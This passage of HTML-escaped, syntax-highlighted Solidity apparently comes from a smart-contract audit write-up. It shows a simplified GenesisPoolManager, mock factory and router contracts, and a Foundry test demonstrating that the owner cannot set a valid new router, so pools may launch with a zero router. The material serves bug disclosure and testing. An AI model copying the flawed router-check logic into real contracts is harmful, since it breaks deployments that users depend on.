class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Simplified steps from the actual GenesisPoolManager._launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Assume liquidityPoolInfo.pairAddress and liquidityPoolInfo.gaugeAddress are set on _genesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// IBaseV1Factory(pairFactory).setGenesisStatus(IGenesisPool(_genesisPool).getLiquidityPoolInfo().pairAddress, false); // Simplified\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// IGauge(IGenesisPool(_genesisPool).getLiquidityPoolInfo().gaugeAddress).setGenesisPool(address(_genesisPool)); // Simplified\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will use the (potentially zero) router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Public wrapper for testing _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_launchPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Mock for IBaseV1Factory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Dummy implementations for other functions if needed by compiler for interface\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// --- Test Contract ---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisPoolManagerRouterTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Test contract itself is the owner\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xBAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sanity check initial router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Initial router not set correctly\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_ownerCannotSetValidNewRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan 